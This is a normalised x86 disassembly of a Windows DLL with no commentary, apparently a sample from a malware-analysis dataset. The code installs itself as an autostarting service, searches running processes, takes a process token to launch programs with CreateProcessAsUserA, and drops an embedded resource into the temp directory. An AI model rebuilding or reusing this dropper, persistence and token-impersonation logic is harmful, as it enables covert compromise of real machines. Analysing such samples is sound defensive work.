sub_10001000
push 0xa
call [ Sleep@IAT ]
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
push 0x1
pop eax
retn 0xc
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi 0x104
mov esi rw-data
push edi
push 0x0
push esi
mov [ rw-data ] ebx
call memset
add esp 0xc
push edi
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
ServiceMain
push ebp
mov ebp esp
sub esp 0x100
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi 0x100
push esi
lea eax [ ebp - 0x100 ]
push [ edi ]
push eax
call [ strncpy@IAT ]
push esi
lea eax [ ebp - 0x100 ]
push [ edi ]
push eax
call [ wcstombs@IAT ]
add esp 0x18
lea eax [ ebp - 0x100 ]
push sub_1000192c
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
xor esi esi
mov [ rw-data ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
leave
retn 0x8
push 0x1
push esi
push 0x2
call sub_100018e4
push esi
push esi
push 0x4
call sub_100018e4
add esp 0x18
call sub_100010bd
sub_100010bd
push rw-data
call sub_10001351
test eax eax
pop ecx
jne r-xdata
push 0xa4cb80
call [ Sleep@IAT ]
jmp sub_100010bd
push rw-data
push 0x6f
push rw-data
call sub_1000128d
add esp 0xc
test eax eax
je r-xdata
push rw-data
call sub_100010fc
pop ecx
sub_100010fc
push ebp
mov ebp esp
sub esp 0x158
push ebx
push rw-data
call sub_100011ed
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0xf01ff
push eax
call [ OpenProcessToken@IAT ]
cmp [ ebp - 0x4 ] ebx
jne r-xdata
pop ebx
leave
retn
push esi
push edi
push 0x44
lea eax [ ebp - 0x58 ]
pop esi
push esi
push ebx
push eax
call memset
mov eax [ rw-data ]
add esp 0xc
mov [ ebp - 0x158 ] eax
xor eax eax
push 0x3f
lea edi [ ebp - 0x154 ]
pop ecx
mov [ ebp - 0x58 ] esi
push [ ebp + 0x8 ]
mov [ ebp - 0x50 ] rw-data
[ edi ]
lea eax [ ebp - 0x158 ]
mov [ ebp - 0x28 ] 0x5
push eax
mov [ ebp - 0x2c ] 0x1
call [ lstrcatA@IAT ]
mov esi [ printf@IAT ]
lea eax [ ebp - 0x158 ]
push eax
push rw-data
call esi
pop ecx
lea eax [ ebp - 0x14 ]
pop ecx
push eax
lea eax [ ebp - 0x58 ]
push eax
push ebx
push ebx
push 0x4000000
push ebx
push ebx
lea eax [ ebp - 0x158 ]
push ebx
push eax
push rw-data
push [ ebp - 0x4 ]
call [ CreateProcessAsUserA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
call [ GetLastError@IAT ]
push eax
push rw-data
call esi
mov esi [ CloseHandle@IAT ]
pop ecx
pop ecx
push [ ebp - 0x14 ]
call esi
push [ ebp - 0x10 ]
call esi
sub_100011ed
push ebp
mov ebp esp
sub esp 0x128
push esi
push edi
push 0x49
xor eax eax
pop ecx
lea edi [ ebp - 0x124 ]
mov [ ebp - 0x128 ] 0x128
push eax
[ edi ]
push 0xf
call CreateToolhelp32Snapshot
mov edi eax
lea eax [ ebp - 0x128 ]
push eax
push edi
call Process32First
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov esi [ _stricmp@IAT ]
lea eax [ ebp - 0x104 ]
push eax
push [ ebp - 0x120 ]
push rw-data
call [ printf@IAT ]
pop ecx
pop ecx
push [ ebp - 0x120 ]
push 0x1
push 0x1f0fff
call [ OpenProcess@IAT ]
jmp r-xdata
lea eax [ ebp - 0x128 ]
push eax
push edi
call Process32Next
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
jmp r-xdata
call esi
pop ecx
test eax eax
pop ecx
je r-xdata
sub_1000128d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
push edi
push esi
push 0xff
call [ GetTempPathA@IAT ]
push 0x40
push esi
push esi
call [ GetLongPathNameA@IAT ]
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
call [ GetModuleHandleA@IAT ]
push 0x0
push 0x2
push 0x2
push 0x0
push 0x2
push 0x40000000
push esi
mov edi eax
call [ CreateFileA@IAT ]
push rw-data
mov esi eax
call [ OutputDebugStringA@IAT ]
cmp esi 0xffffffff
jne r-xdata
movzx eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
push eax
push edi
call [ FindResourceA@IAT ]
mov [ ebp + 0xc ] eax
call [ GetLastError@IAT ]
push [ ebp + 0xc ]
push edi
call [ LoadResource@IAT ]
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
push edi
call [ SizeofResource@IAT ]
lea ecx [ ebp - 0x4 ]
push 0x0
push ecx
push eax
push [ ebp + 0x10 ]
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
push 0x3e8
call [ Sleep@IAT ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_10001351
push ebp
mov ebp esp
sub esp 0x128
push esi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
lea eax [ ebp - 0x128 ]
push eax
push esi
mov [ ebp - 0x128 ] 0x128
call Process32First
test eax eax
je r-xdata
xor eax eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
push eax
push [ ebp + 0x8 ]
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
leave
retn
InstallService
mov eax sub_10001b90
call _EH_prolog
sub esp 0x298
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
push edi
cmp eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] rw-data
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ eax ] bl
je r-xdata
push rw-data
call [ OutputDebugStringA@IAT ]
lea eax [ ebp - 0x2c ]
mov edi 0x258
push eax
lea eax [ ebp - 0x2a4 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push ebx
push rw-data
mov [ ebp - 0x2c ] edi
push [ ebp - 0x14 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
call [ RegCloseKey@IAT ]
push [ ebp + 0x8 ]
call [ SetLastError@IAT ]
cmp [ ebp + 0x8 ] ebx
je r-xdata
push rw-data
call [ OutputDebugStringA@IAT ]
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] rw-data
call _CxxThrowException
mov [ ebp - 0x1c ] eax
lea esi [ ebp - 0x2a4 ]
lea eax [ ebp - 0x40 ]
push r--data
push eax
mov [ ebp - 0x40 ] rw-data
call _CxxThrowException
push rw-data
call [ OutputDebugStringA@IAT ]
cmp [ ebp - 0x2a4 ] 0x0
je r-xdata
push [ ebp - 0x1c ]
push esi
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x28 ] esi
jne r-xdata
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] rw-data
call _CxxThrowException
cmp [ esi ] 0x0
jne r-xdata
push ebx
push esi
call [ strchr@IAT ]
pop ecx
inc eax
pop ecx
mov esi eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
push rw-data
push 0x1
push 0x2
push 0x20
push 0xf01ff
push rw-data
push [ ebp - 0x1c ]
push esi
call [ CreateServiceA@IAT ]
cmp eax ebx
mov [ ebp - 0x24 ] eax
jne r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
mov [ ebp - 0x44 ] rw-data
call _CxxThrowException
cmp [ esi ] 0x0
je r-xdata
mov ebx [ CloseServiceHandle@IAT ]
push eax
call ebx
push esi
call ebx
mov ebx [ strncpy@IAT ]
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
mov esi [ strncat@IAT ]
push 0x64
push [ ebp - 0x1c ]
lea eax [ ebp - 0x2a4 ]
push eax
call esi
add esp 0x18
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x80000002
call [ RegCreateKeyA@IAT ]
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
push 0x64
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x2a4 ]
push eax
call strlen
add esp 0x1c
inc eax
mov esi [ RegSetValueExA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x2
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x2a4 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x1
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x2a4 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x1
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
lea eax [ ebp - 0x18 ]
push 0x4
push eax
push 0x4
push 0x0
push rw-data
push [ ebp - 0x14 ]
mov [ ebp - 0x18 ] 0x1
call esi
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x2a4 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x1
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
push 0x4
lea eax [ ebp - 0x18 ]
pop ebx
mov [ ebp - 0x18 ] 0x2
push ebx
push eax
push ebx
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
lea eax [ ebp - 0x18 ]
push ebx
push eax
push ebx
xor ebx ebx
mov [ ebp - 0x18 ] 0x20
push ebx
push rw-data
push [ ebp - 0x14 ]
call esi
lea eax [ ebp - 0x20 ]
push eax
push rw-data
push [ ebp - 0x14 ]
call [ RegCreateKeyA@IAT ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x2a4 ]
push edi
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push rw-data
call [ OutputDebugStringA@IAT ]
lea eax [ ebp - 0x30 ]
push r--data
push eax
mov [ ebp - 0x30 ] rw-data
call _CxxThrowException
lea eax [ ebp - 0x2a4 ]
push eax
call strlen
pop ecx
inc eax
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x2
push ebx
push rw-data
push [ ebp - 0x20 ]
call esi
mov edi rw-data
push edi
call strlen
inc eax
pop ecx
inc eax
push eax
push edi
push 0x7
push ebx
push rw-data
push [ ebp - 0x14 ]
call esi
mov [ ebp + 0x8 ] eax
push [ ebp - 0x14 ]
mov esi [ RegCloseKey@IAT ]
call esi
push [ ebp - 0x20 ]
call esi
push [ ebp - 0x24 ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push [ ebp - 0x28 ]
call esi
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x38 ]
push r--data
push eax
mov [ ebp - 0x38 ] rw-data
call _CxxThrowException
UninstallService
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
push rw-data
mov esi [ OutputDebugStringA@IAT ]
call esi
mov [ ebp - 0x4 ] ebx
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x21c ] rw-data
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x10000
push [ ebp - 0x21c ]
push [ ebp - 0x24 ]
call [ OpenServiceA@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
push eax
call [ DeleteService@IAT ]
test eax eax
jne r-xdata
push rw-data
jmp r-xdata
mov [ ebp - 0x21c ] eax
push 0x1f4
push rw-data
lea eax [ ebp - 0x218 ]
push eax
call [ strncpy@IAT ]
push 0x64
push [ ebp - 0x21c ]
lea eax [ ebp - 0x218 ]
push eax
call [ strncat@IAT ]
add esp 0x18
push rw-data
push rw-data
jmp r-xdata
call esi
sub_100018e4
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ rw-data ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x20
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x14 ] 0x7
push [ rw-data ]
mov [ ebp - 0x4 ] 0xbb8
call [ SetServiceStatus@IAT ]
leave
retn
sub_1000192c
mov eax [ esp + 0x4 ]
push esi
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x3
call sub_100018e4
add esp 0xc
push 0xa
call [ Sleep@IAT ]
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x6
call sub_100018e4
push esi
push esi
push 0x7
jmp r-xdata
dec eax
je r-xdata
call sub_100018e4
add esp 0x18
jmp r-xdata
xor esi esi
push 0x1
push esi
push 0x5
call sub_100018e4
push esi
push esi
push 0x4
dec eax
je r-xdata
pop esi
retn 0x4
xor esi esi
push esi
push esi
push [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
call sub_100018e4
add esp 0xc
xor esi esi
jmp r-xdata
push esi
push esi
push 0x1
sub_100019c0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10001a32
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10001a32
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10001000
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10001a32
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10001a32
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
installA
push [ esp + 0xc ]
call InstallService
pop ecx
retn 0x10
sub_100018aa
push 0x1
pop eax
retn
uninstallA
push [ esp + 0xc ]
call UninstallService
pop ecx
retn 0x10
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
memset
jmp [ memset@IAT ]
strcat
jmp [ strcat@IAT ]
sub_100019f6
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
strlen
jmp [ strlen@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_10001b90
mov eax r--data
jmp __CxxFrameHandler
